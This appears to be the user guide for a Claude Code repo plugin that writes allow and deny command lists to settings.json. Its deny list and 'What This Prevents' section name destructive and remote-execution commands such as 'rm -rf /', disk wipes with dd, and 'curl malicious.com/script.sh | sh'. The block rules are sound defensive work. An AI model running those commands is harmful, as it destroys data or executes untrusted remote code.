# Permission Management Guide

**Version**: 2.1.0
**Feature**: Claude Code Permission Configuration

## Overview

The repo plugin includes a **permission management system** that configures Claude Code permissions in `.claude/settings.json`. This eliminates frequent permission prompts while preventing catastrophic operations.

## Why This Matters

### Without Permission Configuration

When using the repo plugin without configured permissions, you'll experience:
- ❌ Constant prompts for every `git` command
- ❌ Frequent interruptions asking "allow git push?"
- ❌ Slower workflow due to manual approvals
- ❌ No protection against dangerous commands

### With Permission Configuration

After running `/repo:init-permissions`, you get:
- ✅ **Zero prompts** for repo operations
- ✅ **Faster workflow** - commands execute immediately
- ✅ **Protection** against dangerous operations
- ✅ **Peace of mind** - explicit safety rules

## Quick Start

```bash
# Run this once after installing repo plugin
/repo:init-permissions

# That's it! Now use repo commands without prompts
/repo:branch create 123 "add export feature"
/repo:commit "Add CSV export" --type feat --work-id 123
/repo:push --set-upstream
```

## What Gets Configured

### Allowed Commands (No Prompts)

The following commands are explicitly **allowed** - they will execute without prompting:

#### Git Core Operations (23 commands)
```bash
git status          # Check repository status
git branch          # List/manage branches
git checkout        # Switch branches (legacy)
git switch          # Switch branches (modern)
git commit          # Create commits
git push            # Push to remote
git pull            # Pull from remote
git fetch           # Fetch updates
git remote          # Manage remotes
git tag             # Create/list tags
git log             # View commit history
git diff            # Show differences
git stash           # Stash changes
git merge           # Merge branches
git rebase          # Rebase branches
git rev-parse       # Parse revisions
git for-each-ref    # Iterate refs
git ls-remote       # List remote refs
git show-ref        # Show refs
git add             # Stage changes
git reset           # Unstage changes
git show            # Show objects
git config          # Configure git
```

#### GitHub CLI Operations (20 commands)
```bash
# Pull requests
gh pr create        # Create pull request
gh pr view          # View PR details
gh pr list          # List PRs
gh pr comment       # Comment on PR
gh pr review        # Review PR
gh pr merge         # Merge PR
gh pr close         # Close PR
gh pr status        # PR status

# Issues
gh issue create     # Create issue
gh issue view       # View issue
gh issue list       # List issues
gh issue comment    # Comment on issue
gh issue close      # Close issue

# Repository
gh repo view        # View repo info
gh repo clone       # Clone repository

# Authentication
gh auth status      # Check auth status
gh auth login       # Login to GitHub

# API
gh api              # GitHub API calls
```

#### Safe Utilities (10 commands)
```bash
cat                 # Display file contents
head                # Show file start
tail                # Show file end
grep                # Search text
find                # Find files
ls                  # List directory
pwd                 # Print working directory
jq                  # JSON processor
sed                 # Stream editor
awk                 # Text processor
```

**Total Allowed**: ~50 commands

### Denied Commands (Explicit Blocks)

The following commands are explicitly **denied** - they will be blocked even if Claude tries to run them:

#### Destructive File Operations
```bash
rm -rf /            # Delete entire filesystem
rm -rf *            # Delete all files in directory
rm -rf .            # Delete current directory
rm -rf ~            # Delete home directory
dd if=              # Disk duplication (dangerous)
mkfs                # Format filesystem
format              # Format drive
> /dev/sd*          # Write to device files
```

#### Dangerous Git Operations
```bash
# Force push to protected branches
git push --force origin main
git push --force origin master
git push --force origin production
git push -f origin main
git push -f origin master
git push -f origin production

# Other dangerous git operations
git reset --hard origin/    # Hard reset to remote
git clean -fdx              # Delete untracked files
git filter-branch           # Rewrite history
git rebase --onto           # Complex rebasing
```

#### Dangerous GitHub Operations
```bash
gh repo delete      # Delete repository
gh repo archive     # Archive repository
gh secret delete    # Delete secrets
```

#### System Operations
```bash
sudo                # Privilege escalation
su                  # Switch user
chmod 777           # Insecure permissions
chown               # Change ownership
kill -9             # Force kill
pkill               # Kill processes
shutdown            # Shutdown system
reboot              # Reboot system
init                # Change init state
systemctl           # System control
```

#### Network Security Risks
```bash
curl | sh           # Remote code execution
wget | sh           # Remote code execution
curl | bash         # Remote code execution
wget | bash         # Remote code execution
```

**Total Denied**: ~25 dangerous patterns

## Command Reference

### /repo:init-permissions

Configure permissions for the repo plugin.

```bash
# Setup (default) - Configure permissions
/repo:init-permissions
/repo:init-permissions --mode setup

# Validate - Check if permissions are correct
/repo:init-permissions --mode validate

# Reset - Remove repo-specific permissions
/repo:init-permissions --mode reset
```

#### Parameters

- `--mode <setup|validate|reset>` (optional, default: `setup`)
  - **setup** - Configure permissions (first time or update)
  - **validate** - Check current permissions
  - **reset** - Remove repo permissions, restore defaults

## Usage Examples

### Example 1: First-Time Setup

**Scenario**: You just installed the repo plugin and want to configure permissions.

```bash
/repo:init-permissions
```

**Output**:
```
🔐 STARTING: Permission Manager
Mode: setup
Project: /home/user/my-project
Settings file: /home/user/my-project/.claude/settings.json
───────────────────────────────────────
No existing settings found, creating new...

🔐 Permission Changes
───────────────────────────────────────

ALLOWING (repo operations):
  ✓ git status, branch, checkout, switch
  ✓ git commit, push, pull, fetch, remote
  ✓ git tag, log, diff, stash, merge, rebase
  ✓ gh pr create, view, list, comment, review, merge
  ✓ gh issue create, view, list, comment
  ✓ gh repo view, clone
  ✓ Safe utilities (cat, grep, jq, sed, awk)

DENYING (dangerous operations):
  ✗ rm -rf / * . ~
  ✗ git push --force origin main/master/production
  ✗ gh repo delete/archive
  ✗ sudo, chmod 777, shutdown
  ✗ curl/wget | sh (remote code execution)

───────────────────────────────────────
These permissions will:
  ✓ Eliminate prompts for repo operations
  ✓ Prevent accidental catastrophic commands
  ✓ Allow safe git and GitHub operations

✅ COMPLETED: Permission Manager
───────────────────────────────────────
Settings file: .claude/settings.json
Backup saved: .claude/settings.json.backup

Changes applied:
  • 50 commands allowed
  • 25 commands denied
  • 0 existing rules preserved

Next steps:
  1. Test repo commands: /repo:branch create test-123 "test branch"
  2. Verify no prompts appear
  3. Review settings: cat .claude/settings.json
───────────────────────────────────────
```

### Example 2: Validate Existing Permissions

**Scenario**: You want to check if permissions are still correctly configured.

```bash
/repo:init-permissions --mode validate
```

**Output**:
```
🔐 Validating Permissions
───────────────────────────────────────

✓ git commands: allowed
✓ gh pr commands: allowed
✓ Dangerous commands: denied
✓ Settings file: valid JSON

All critical permissions correctly configured
```

### Example 3: Update Permissions After Plugin Update

**Scenario**: The repo plugin was updated with new commands and you want to ensure permissions are current.

```bash
/repo:init-permissions --mode setup
```

**Output**:
```
🔐 Permission Manager
Existing settings found (backed up)

NEW ALLOWS: git stash, gh pr status (2 new)
NEW DENIES: (none)
PRESERVED: 50 existing rules

✅ Updated .claude/settings.json
   52 commands allowed
   25 commands denied
```

### Example 4: Reset Permissions

**Scenario**: You want to remove repo-specific permissions and return to defaults.

```bash
/repo:init-permissions --mode reset
```

**Output**:
```
⚠ Resetting Permissions
This will remove all repo-specific permissions

✅ Reset complete
   Removed repo-specific permissions
   Backup: .claude/settings.json.backup

To reconfigure: /repo:init-permissions --mode setup
```

## Settings File Structure

The permission configuration is stored in `.claude/settings.json`:

```json
{
  "permissions": {
    "bash": {
      "allow": [
        "awk",
        "cat",
        "echo",
        "find",
        "gh api",
        "gh auth login",
        "gh auth status",
        "gh issue close",
        "gh issue comment",
        "gh issue create",
        "gh issue list",
        "gh issue view",
        "gh pr close",
        "gh pr comment",
        "gh pr create",
        "gh pr list",
        "gh pr merge",
        "gh pr review",
        "gh pr status",
        "gh pr view",
        "gh repo clone",
        "gh repo view",
        "git add",
        "git branch",
        "git checkout",
        "git commit",
        "git config",
        "git diff",
        "git fetch",
        "git for-each-ref",
        "git log",
        "git ls-remote",
        "git merge",
        "git pull",
        "git push",
        "git rebase",
        "git remote",
        "git reset",
        "git rev-parse",
        "git show",
        "git show-ref",
        "git stash",
        "git status",
        "git switch",
        "git tag",
        "grep",
        "head",
        "jq",
        "ls",
        "pwd",
        "sed",
        "sort",
        "tail",
        "uniq",
        "wc",
        "which"
      ],
      "deny": [
        "> /dev/sd",
        "chown",
        "chmod 777",
        "curl | bash",
        "curl | sh",
        "dd if=",
        "format",
        "gh repo archive",
        "gh repo delete",
        "gh secret delete",
        "git clean -fdx",
        "git filter-branch",
        "git push --force origin main",
        "git push --force origin master",
        "git push --force origin production",
        "git push -f origin main",
        "git push -f origin master",
        "git push -f origin production",
        "git rebase --onto",
        "git reset --hard origin/",
        "init",
        "kill -9",
        "mkfs",
        "pkill",
        "reboot",
        "rm -rf /",
        "rm -rf *",
        "rm -rf .",
        "rm -rf ~",
        "shutdown",
        "su",
        "sudo",
        "systemctl",
        "wget | bash",
        "wget | sh"
      ]
    }
  },
  "_comment": "Managed by fractary-repo plugin. Backup: .claude/settings.json.backup"
}
```

### Key Features of Settings Structure

1. **Alphabetically Sorted** - Easy to scan and find specific commands
2. **No Duplicates** - Existing and new permissions merged intelligently
3. **Preserves Existing Rules** - Non-repo permissions remain untouched
4. **Valid JSON** - Validated before writing
5. **Commented** - Includes note about management

## Safety Features

### Automatic Backups

Every permission change creates a backup:

```bash
.claude/settings.json         # Active settings
.claude/settings.json.backup  # Backup before last change
```

**Restore from backup**:
```bash
mv .claude/settings.json.backup .claude/settings.json
```

### Validation

All changes are validated before applying:
- ✅ JSON structure validation
- ✅ File permissions check
- ✅ Malformed JSON detection
- ✅ Automatic rollback on failure

### Preservation of Existing Settings

The permission manager:
- ✅ Preserves existing non-repo permissions
- ✅ Only adds/removes repo-specific rules
- ✅ Maintains other tool configurations
- ✅ Merges intelligently (no duplicates)

### User Confirmation

**All changes require explicit confirmation** (when running interactively):
```
Continue? (yes/no)
```

Type `yes` to proceed, anything else cancels.

## Best Practices

### When to Run Permission Setup

#### Required Before First Use
```bash
# Install repo plugin
claude plugin install fractary/repo

# Configure permissions FIRST
/repo:init-permissions

# Now use repo commands
/repo:branch create 123 "my feature"
```

#### After Plugin Updates
```bash
# Pull latest plugin version
git pull

# Update permissions
/repo:init-permissions --mode setup
```

#### If You Start Seeing Prompts
```bash
# Validate permissions
/repo:init-permissions --mode validate

# If validation fails, reconfigure
/repo:init-permissions --mode setup
```

#### Before Important Work
```bash
# Validate everything is set up correctly
/repo:init-permissions --mode validate
```

### Security Best Practices

1. **Review Settings Regularly**
   ```bash
   cat .claude/settings.json
   ```

2. **Keep Backups**
   ```bash
   cp .claude/settings.json .claude/settings.json.manual-backup
   ```

3. **Use Reset if Uncertain**
   ```bash
   /repo:init-permissions --mode reset
   /repo:init-permissions --mode setup
   ```

4. **Validate After Manual Changes**
   ```bash
   # If you manually edit .claude/settings.json
   /repo:init-permissions --mode validate
   ```

5. **Understand What You're Allowing**
   - Read the allowed commands list above
   - Know what each command does
   - Don't add dangerous patterns to allow list

## Troubleshooting

### Problem: Permission Denied Error

```
ERROR: Cannot write to .claude/settings.json
Reason: Permission denied
```

**Solution**:
```bash
# Check directory permissions
ls -la .claude/

# Create directory with proper permissions
mkdir -p .claude && chmod 755 .claude

# Try again
/repo:init-permissions
```

### Problem: Invalid JSON Error

```
ERROR: Existing settings.json contains invalid JSON
Backup: .claude/settings.json.backup
```

**Solution**:
```bash
# Option 1: Restore backup
mv .claude/settings.json.backup .claude/settings.json

# Option 2: Reset to defaults
/repo:init-permissions --mode reset

# Option 3: Fix manually
vim .claude/settings.json
# Fix JSON syntax errors

# Validate
/repo:init-permissions --mode validate
```

### Problem: Still Getting Permission Prompts

**Diagnosis**:
```bash
# Check if command is in allow list
cat .claude/settings.json | jq '.permissions.bash.allow'

# Validate permissions
/repo:init-permissions --mode validate
```

**Solution**:
```bash
# Re-run setup
/repo:init-permissions --mode setup

# If specific command missing, manually add to allow list
# (or request it be added to repo plugin defaults)
```

### Problem: Command Blocked That Shouldn't Be

**Example**: You need `git push --force` for a feature branch.

**Solution**:
```bash
# The deny rule only blocks force push to main/master/production
# Force push to feature branches is allowed

# If you really need to force push to main (not recommended):
# 1. Temporarily edit .claude/settings.json
# 2. Remove the specific deny rule
# 3. Do your operation
# 4. Restore the deny rule
```

## Advanced Usage

### Manual Editing

You can manually edit `.claude/settings.json`:

```bash
# Edit settings
vim .claude/settings.json

# Add custom allow rules
{
  "permissions": {
    "bash": {
      "allow": [
        "git status",
        "my-custom-command"  # Add this
      ]
    }
  }
}

# Validate JSON
jq empty .claude/settings.json

# Test
/repo:init-permissions --mode validate
```

### Project-Specific Permissions

Each project has its own `.claude/settings.json`:

```bash
project-a/.claude/settings.json  # Project A permissions
project-b/.claude/settings.json  # Project B permissions
```

This allows different permission profiles per project.

### Integration with CI/CD

If running in CI/CD, setup permissions programmatically:

```bash
#!/bin/bash
# ci-setup.sh

# Create .claude directory
mkdir -p .claude

# Copy pre-configured settings
cp ci/claude-settings.json .claude/settings.json

# Validate
/repo:init-permissions --mode validate
```

## Security Considerations

### Permission Philosophy

The repo plugin follows security best practices:

1. **Principle of Least Privilege**
   - Only commands repo plugin actually needs
   - No wildcards or broad patterns
   - Specific command allow-listing

2. **Defense in Depth**
   - Explicit allow list (whitelist)
   - Explicit deny list (blacklist)
   - Multiple layers of protection

3. **User Transparency**
   - Always show what's changing
   - Require confirmation
   - Provide clear documentation

4. **Easy Audit**
   - Settings stored in readable JSON
   - Sorted alphabetically
   - Clear categorization

5. **Simple Rollback**
   - Automatic backups
   - Easy restoration
   - Reset command available

### What This Prevents

#### Catastrophic Mistakes
- ❌ `rm -rf /` (delete filesystem)
- ❌ `dd if=/dev/zero of=/dev/sda` (wipe disk)
- ❌ `mkfs /dev/sda1` (format partition)

#### Repository Corruption
- ❌ `git push --force origin main` (protected branch)
- ❌ `git reset --hard origin/main && git push --force` (destroy history)
- ❌ `gh repo delete` (delete repository)

#### Security Breaches
- ❌ `curl malicious.com/script.sh | sh` (remote code execution)
- ❌ `sudo rm -rf /` (privilege escalation)
- ❌ `chmod 777 /` (insecure permissions)

#### Accidental System Damage
- ❌ `shutdown now` (system shutdown)
- ❌ `kill -9 1` (kill init process)
- ❌ `systemctl stop sshd` (lose remote access)

### What This Allows

#### Safe Git Operations
- ✅ Create branches, commits, tags
- ✅ Push to feature branches
- ✅ Pull, fetch, merge, rebase
- ✅ View logs, diffs, status

#### Safe GitHub Operations
- ✅ Create and manage PRs
- ✅ Comment and review
- ✅ Create and manage issues
- ✅ View repository info

#### Safe File Operations
- ✅ Read files (cat, head, tail)
- ✅ Search content (grep, find)
- ✅ Process data (jq, sed, awk)

## Related Documentation

- [Repo Plugin README](../README.md) - Full plugin documentation
- [Init Permissions Command](../commands/init-permissions.md) - Command reference
- [Configuration Guide](configuration-guide.md) - Advanced configuration
- [Security Best Practices](security.md) - Security guidelines (if exists)

## FAQ

### Q: Do I need to run this for every project?

**A**: Yes, each project has its own `.claude/settings.json`. Run `/repo:init-permissions` once per project.

### Q: Will this affect other Claude Code plugins?

**A**: No, the permission manager only adds repo-specific rules. Other plugins' permissions are preserved.

### Q: Can I customize which commands are allowed/denied?

**A**: Yes, manually edit `.claude/settings.json` to add custom rules. Be careful not to introduce security risks.

### Q: What if I need a dangerous command (like force push)?

**A**: Force push is allowed to feature branches. It's only denied to main/master/production. If you truly need it, temporarily edit the deny list, but be very careful.

### Q: Can I reset to defaults?

**A**: Yes, run `/repo:init-permissions --mode reset` to remove all repo-specific permissions.

### Q: How do I backup my settings?

**A**: Automatic backup is created at `.claude/settings.json.backup`. You can also manually copy the file.

### Q: What happens if permission setup fails?

**A**: The script validates all changes and rolls back on failure. Your original settings are preserved in the backup file.

### Q: Do permissions affect FABER workflows?

**A**: Yes! With permissions configured, FABER workflows using repo plugin will run faster without interruptions.

---

**Pro Tip**: Run `/repo:init-permissions` immediately after installing the repo plugin for the best experience!
